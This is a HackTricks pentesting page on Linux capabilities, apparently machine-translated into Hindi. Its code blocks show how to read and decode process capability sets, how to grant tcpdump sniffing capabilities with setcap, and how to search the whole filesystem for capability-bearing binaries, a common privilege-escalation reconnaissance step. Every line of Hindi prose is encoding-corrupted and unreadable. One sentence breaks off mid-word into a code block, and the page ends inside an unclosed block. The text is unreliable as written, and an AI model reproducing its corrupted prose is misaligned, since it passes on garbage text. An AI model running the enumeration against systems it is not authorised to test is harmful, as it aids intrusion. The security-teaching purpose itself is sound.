# ‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ‡§ï‡•ç‡§Ø‡§æ ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä **‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡§Ç‡§™‡§®‡•Ä** ‡§Æ‡•á‡§Ç ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç? ‡§ï‡•ç‡§Ø‡§æ ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä ‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡•ã **‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§ø‡§§** ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç? ‡§Ø‡§æ ‡§ï‡•ç‡§Ø‡§æ ‡§Ü‡§™‡§ï‡•ã **PEASS ‡§ï‡•Ä ‡§®‡§µ‡•Ä‡§®‡§§‡§Æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§Ø‡§æ HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§á‡§ö‡•ç‡§õ‡§æ ‡§π‡•à? [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§è‡§ï‡§≤ [**NFT**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•§
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks swag**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** ‡§Ø‡§æ ‡§Æ‡•Å‡§ù‡•á **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** ‡§ï‡§æ** ‡§Ö‡§®‡•Å‡§∏‡§∞‡§£ ‡§ï‡§∞‡•á‡§Ç‡•§**
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§ï‡•ã** [**hacktricks ‡§∞‡•á‡§™‡•ã**](https://github.com/carlospolop/hacktricks) **‡§î‡§∞** [**hacktricks-cloud ‡§∞‡•á‡§™‡•ã**](https://github.com/carlospolop/hacktricks-cloud) **‡§Æ‡•á‡§Ç ‡§™‡•Ä‡§Ü‡§∞ ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç‡•§**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ‡§∏‡•ç‡§™‡•á‡§® ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§á‡§µ‡•á‡§Ç‡§ü ‡§π‡•à ‡§î‡§∞ ‡§Ø‡•Ç‡§∞‡•ã‡§™ ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Æ‡§æ‡§®‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§§‡§ï‡§®‡•Ä‡§ï‡•Ä ‡§ú‡•ç‡§û‡§æ‡§® ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§®‡•á ‡§ï‡•Ä ‡§Æ‡§ø‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§Ø‡§π ‡§ï‡§æ‡§Ç‡§ó‡•ç‡§∞‡•á‡§∏ ‡§™‡•ç‡§∞‡•å‡§¶‡•ç‡§Ø‡•ã‡§ó‡§ø‡§ï‡•Ä ‡§î‡§∞ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§â‡§¨‡§≤‡§§‡§æ ‡§π‡•Å‡§Ü ‡§Æ‡§ø‡§≤‡§® ‡§∏‡•ç‡§•‡§≤ ‡§π‡•à‡•§

{% embed url="https://www.rootedcon.com/" %}

## ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ç‡§Ø‡•ã‡§Ç?

‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§∞‡•Ç‡§ü ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡§æ ‡§è‡§ï ‡§â‡§™‡§∏‡•á‡§ü ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§∏‡•á ‡§∞‡•Ç‡§ü ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§õ‡•ã‡§ü‡•á ‡§î‡§∞ ‡§Ö‡§≤‡§ó-‡§Ö‡§≤‡§ó ‡§á‡§ï‡§æ‡§á‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§≠‡§æ‡§ú‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§á‡§ï‡§æ‡§à ‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§µ‡§§‡§Ç‡§§‡•ç‡§∞ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§§‡§∞‡§π ‡§™‡•Ç‡§∞‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§ï‡§Æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§â‡§§‡•ç‡§™‡•Ä‡§°‡§º‡§® ‡§ï‡•á ‡§ú‡•ã‡§ñ‡§ø‡§Æ ‡§ï‡•ã ‡§ï‡§Æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§¨‡•á‡§π‡§§‡§∞ ‡§∏‡§Æ‡§ù ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§π‡§Æ ‡§™‡§π‡§≤‡•á ‡§â‡§∏ ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ ‡§™‡§∞ ‡§®‡§ú‡§º‡§∞ ‡§°‡§æ‡§≤‡•á‡§Ç ‡§ú‡§ø‡§∏‡•á ‡§Ø‡§π ‡§π‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§

‡§ö‡§≤‡•ã ‡§Æ‡§æ‡§® ‡§≤‡•á‡§§‡•á ‡§π‡•à‡§Ç ‡§π‡§Æ ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§è‡§ï ‡§∏‡§æ‡§ß‡§æ‡§∞‡§£ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡§≤‡§æ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§π‡§Æ ‡§ó‡•à‡§∞-‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡•É‡§§ ‡§π‡•à‡§Ç‡•§ ‡§π‡§Æ ‡§ï‡•á‡§µ‡§≤ ‡§â‡§® ‡§°‡•á‡§ü‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§π‡§Æ‡§æ‡§∞‡•á ‡§™‡§æ‡§∏, ‡§π‡§Æ‡§æ‡§∞‡•á ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§π‡•à, ‡§Ø‡§æ ‡§ú‡§ø‡§∏‡•á ‡§∏‡§≠‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§π‡•Å‡§Ç‡§ö ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ö‡§ø‡§π‡•ç‡§®‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§ ‡§ï‡§ø‡§∏‡•Ä ‡§∏‡§Æ‡§Ø ‡§¨‡§æ‡§¶, ‡§π‡§Æ‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Ö‡§™‡§®‡•á ‡§ï‡§∞‡•ç‡§§‡§µ‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•Ç‡§∞‡§æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§•‡•ã‡§°‡§º‡•Ä ‡§Ö‡§ß‡§ø‡§ï ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§ú‡•à‡§∏‡•á ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§∏‡•â‡§ï‡•á‡§ü ‡§ñ‡•ã‡§≤‡§®‡§æ‡•§ ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø ‡§∏‡§æ‡§ß‡§æ‡§∞‡§£ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∏‡•â‡§ï‡•á‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§ñ‡•ã‡§≤ ‡§∏‡§ï‡§§‡•á, ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡•Ç‡§ü ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

## ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü

**‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç**

**CapEff**: _‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä_ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§® ‡§∏‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§§‡§ø‡§∑‡•ç‡§†‡§æ‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•Ä ‡§π‡•à (‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§è‡§ï‡§≤ ‡§¨‡§ø‡§ü ‡§π‡•à ‡§ú‡•ã ‡§á‡§∏‡§ï‡§æ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ö‡§≤‡§æ‡§®‡•á ‡§™‡§∞ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§≤‡•á ‡§ú‡§æ‡§è‡§ó‡•Ä)‡•§ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§≠
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
‡§Ø‡§π ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§Ç‡§∂ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ‡•ã‡§Ç ‡§™‡§∞ 5 ‡§™‡§Ç‡§ï‡•ç‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§≤‡•å‡§ü‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

* CapInh = ‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§Æ‡•á‡§Ç ‡§Æ‡§ø‡§≤‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç
* CapPrm = ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç
* CapEff = ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç
* CapBnd = ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§∏‡•á‡§ü
* CapAmb = ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£‡•Ä‡§Ø ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§∏‡•á‡§ü
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
‡§Ø‡•á ‡§π‡•á‡§ï‡•ç‡§∏‡§æ‡§°‡•á‡§∏‡§ø‡§Æ‡§≤ ‡§®‡§Ç‡§¨‡§∞‡•ç‡§∏ ‡§∏‡§Æ‡§ù ‡§Æ‡•á‡§Ç ‡§®‡§π‡•Ä‡§Ç ‡§Ü‡§§‡•á‡•§ ‡§π‡§Æ capsh ‡§Ø‡•Ç‡§ü‡§ø‡§≤‡§ø‡§ü‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§á‡§®‡•ç‡§π‡•á‡§Ç ‡§ï‡•à‡§™‡•á‡§¨‡§ø‡§≤‡§ø‡§ü‡•Ä‡§ú‡§º ‡§®‡§æ‡§Æ ‡§Æ‡•á‡§Ç ‡§°‡§ø‡§ï‡•ã‡§° ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
‡§ö‡§≤‡•ã ‡§Ö‡§¨ ‡§¶‡•á‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø `ping` ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç** ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•à‡§Ç:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
‡§Ø‡§¶‡•ç‡§Ø‡§™‡§ø ‡§µ‡§π ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§è‡§ï ‡§î‡§∞ ‡§Ü‡§∏‡§æ‡§® ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§π‡•à‡•§ ‡§è‡§ï ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§∏‡•Ä‡§ß‡•á **getpcaps** ‡§â‡§™‡§ï‡§∞‡§£ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Ü‡§à‡§°‡•Ä (PID) ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§ú‡§æ‡§è‡§Ç‡•§ ‡§Ü‡§™ ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Ü‡§à‡§°‡•Ä ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```bash
getpcaps 1234
```
‡§Ø‡§π‡§æ‡§Ç ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø `tcpdump` ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§ï‡•ç‡§Ø‡§æ ‡§π‡§æ‡§≤ ‡§π‡•à ‡§ú‡§¨ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ( `cap_net_admin` ‡§î‡§∞ `cap_net_raw`) ‡§¶‡•Ä ‡§ó‡§à ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§ï‡•ã ‡§∏‡•ç‡§®‡§ø‡§´ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á (_tcpdump ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ 9562 ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•à_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§¶‡§ø‡§è ‡§ó‡§è capabilities ‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á capabilities ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Æ‡•á‡§≤ ‡§ñ‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§
_getpcaps_ ‡§ü‡•Ç‡§≤ **capget()** ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ thread ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§≤‡§¨‡•ç‡§ß capabilities ‡§ï‡•ã ‡§™‡•ç‡§∞‡§∂‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡•á‡•§ ‡§á‡§∏ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡•ã ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•á‡§µ‡§≤ PID ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

### ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç

‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, `ping` ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç `cap_net_raw` ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Æ‡§ø‡§≤‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§π‡•à:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ñ‡•ã‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**:
```bash
getcap -r / 2>/dev/null
```
### capsh ‡§ï‡•á ‡§∏‡§æ‡§• capabilities ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º‡§®‡§æ

‡§Ø‡§¶‡§ø ‡§π‡§Æ _ping_ ‡§ï‡•á ‡§≤‡§ø‡§è CAP\_NET\_RAW capabilities ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º ‡§¶‡•á‡§Ç, ‡§§‡•ã ping ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä‡§§‡§æ ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§ó‡•Ä‡•§
```bash
